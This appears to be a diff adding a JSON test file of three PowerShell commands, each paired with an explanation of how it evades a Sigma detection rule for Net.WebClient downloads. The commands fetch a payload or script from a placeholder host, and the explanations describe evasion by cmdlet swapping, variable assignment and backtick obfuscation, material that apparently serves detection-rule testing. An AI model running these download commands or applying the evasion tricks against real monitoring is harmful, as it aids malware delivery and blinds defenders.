@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri '[http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)' -OutFile 'C:\\Windows\\Temp\\payload.exe'\"",
+    "explanation": "Bypasses the rule by using the Invoke-WebRequest cmdlet instead of the Net.WebClient class. The rule strictly looks for 'new-object', 'net.webclient).', and 'download', which are completely absent when using Invoke-WebRequest or its aliases (iwr)."
+  },
+  {
+    "output": "powershell.exe -Command \"$client = New-Object System.Net.WebClient; $client.DownloadString('[http://example.com/script.ps1](https://www.google.com/search?q=http://example.com/script.ps1)')\"",
+    "explanation": "Bypasses the rule by breaking the strict sequence 'net.webclient).'. The rule assumes the inline syntax '(New-Object Net.WebClient).DownloadString'. By assigning the WebClient object to a variable first, the parenthesis never immediately precedes the dot, causing the string match to fail."
+  },
+  {
+    "output": "powershell.exe -Command \"(New-Object Net.WebC`lient).DownloadString('[http://example.com/script.ps1](https://www.google.com/search?q=http://example.com/script.ps1)')\"",
+    "explanation": "Bypasses the rule by utilizing PowerShell's backtick obfuscation. Inserting a backtick character inside 'WebClient' breaks the Sigma rule's literal string match for 'net.webclient).' while still executing perfectly within the PowerShell engine."
+  }
+]
